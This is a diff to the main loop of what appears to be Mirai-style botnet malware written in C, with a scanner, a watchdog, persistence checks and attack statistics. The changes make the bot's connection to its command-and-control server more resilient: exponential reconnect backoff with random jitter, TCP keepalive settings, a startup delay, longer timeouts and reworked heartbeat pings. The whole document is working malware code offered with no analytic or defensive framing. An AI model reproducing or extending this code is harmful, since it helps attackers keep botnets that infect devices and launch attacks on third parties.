@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <netinet/tcp.h>
 #include <sys/prctl.h>
 #include <sys/select.h>
 #include <signal.h>
@@ -49,6 +50,9 @@ int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0, scanner_pid = 0;
 BOOL pending_connection = FALSE;
 volatile sig_atomic_t shutdown_requested = 0;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr;
+static uint32_t reconnect_delay = 5;
+static uint32_t failed_connect_attempts = 0;
+static BOOL first_connect = TRUE;
 #ifdef DEBUG
     static void segv_handler(int sig, siginfo_t *si, void *unused)
     {
@@ -220,6 +224,13 @@ scanner_init();
     signal(SIGTERM, graceful_shutdown_handler);
     signal(SIGINT, graceful_shutdown_handler);
     uint32_t persistence_check_counter = 0;
+    
+    if(first_connect)
+    {
+        sleep(15);
+        first_connect = FALSE;
+    }
+    
     while (TRUE)
     {
         persistence_check_counter++;
@@ -285,7 +296,7 @@ scanner_init();
         else
             mfd = fd_serv;
         timeo.tv_usec = 0;
-        timeo.tv_sec = 10;
+        timeo.tv_sec = 30;
         nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
         if (nfds == -1)
         {
@@ -296,13 +307,13 @@ scanner_init();
         }
         else if (nfds == 0)
         {
-            uint16_t len = 0;
-            if (pings++ % 6 == 0)
+            if (fd_serv != -1 && !pending_connection)
             {
-                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
-            }
-            if (fd_serv != -1)
-            {
+                uint16_t len = 0;
+                if (pings++ % 6 == 0)
+                {
+                    send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+                }
                 attack_stats_send();
             }
         }
@@ -334,6 +345,10 @@ scanner_init();
                     printf("[main] timed out while connecting to CNC\n");
                 #endif
                 teardown_connection();
+                failed_connect_attempts++;
+                if(reconnect_delay < 300)
+                    reconnect_delay = reconnect_delay * 2;
+                sleep(reconnect_delay + (rand_next() % 10));
             }
             else
             {
@@ -347,7 +362,10 @@ scanner_init();
                     #endif
                     close(fd_serv);
                     fd_serv = -1;
-                    sleep((rand_next() % 10) + 1);
+                    failed_connect_attempts++;
+                    if(reconnect_delay < 300)
+                        reconnect_delay = reconnect_delay * 2;
+                    sleep(reconnect_delay + (rand_next() % 10));
                 }
                 else
                 {
@@ -362,6 +380,8 @@ scanner_init();
                     attack_stats_init(fd_serv);
                     sleep(1); 
                     cnc_send_self_peer_info();
+                    failed_connect_attempts = 0;
+                    reconnect_delay = 5;
                     #ifdef DEBUG
                         printf("[main] connected to CNC.\n");
                     #endif
@@ -388,6 +408,10 @@ scanner_init();
                     printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                 #endif
                 teardown_connection();
+                failed_connect_attempts++;
+                if(reconnect_delay < 300)
+                    reconnect_delay = reconnect_delay * 2;
+                sleep(reconnect_delay + (rand_next() % 10));
                 continue;
             }
             if(len == 0)
@@ -400,6 +424,10 @@ scanner_init();
             {
                 close(fd_serv);
                 fd_serv = -1;
+                failed_connect_attempts++;
+                if(reconnect_delay < 300)
+                    reconnect_delay = reconnect_delay * 2;
+                sleep(reconnect_delay + (rand_next() % 10));
                 continue;
             }
             errno = 0;
@@ -417,6 +445,10 @@ scanner_init();
                     printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                 #endif
                 teardown_connection();
+                failed_connect_attempts++;
+                if(reconnect_delay < 300)
+                    reconnect_delay = reconnect_delay * 2;
+                sleep(reconnect_delay + (rand_next() % 10));
                 continue;
             }
             recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
@@ -508,15 +540,29 @@ static void resolve_cnc_addr(void)
 static void establish_connection(void)
 {
     #ifdef DEBUG
-        printf("[main] attempting to connect to CNC\n");
+        printf("[main] attempting to connect to CNC (attempt %u, delay %u)\n", failed_connect_attempts, reconnect_delay);
     #endif
     if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
         #ifdef DEBUG
             printf("[main] failed to call socket(). Errno = %d\n", errno);
         #endif
+        failed_connect_attempts++;
+        if(reconnect_delay < 300)
+            reconnect_delay = reconnect_delay * 2;
+        sleep(reconnect_delay + (rand_next() % 10));
         return;
     }
+    
+    int opt = 1;
+    setsockopt(fd_serv, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
+    opt = 30;
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPIDLE, &opt, sizeof(opt));
+    opt = 5;
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPINTVL, &opt, sizeof(opt));
+    opt = 3;
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPCNT, &opt, sizeof(opt));
+    
     fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
     if(resolve_func != NULL)
         resolve_func();
@@ -531,7 +577,7 @@ static void teardown_connection(void)
     if(fd_serv != -1)
         close(fd_serv);
     fd_serv = -1;
-    sleep(1);
+    pending_connection = FALSE;
 }
 static void graceful_shutdown_handler(int sig)
 {
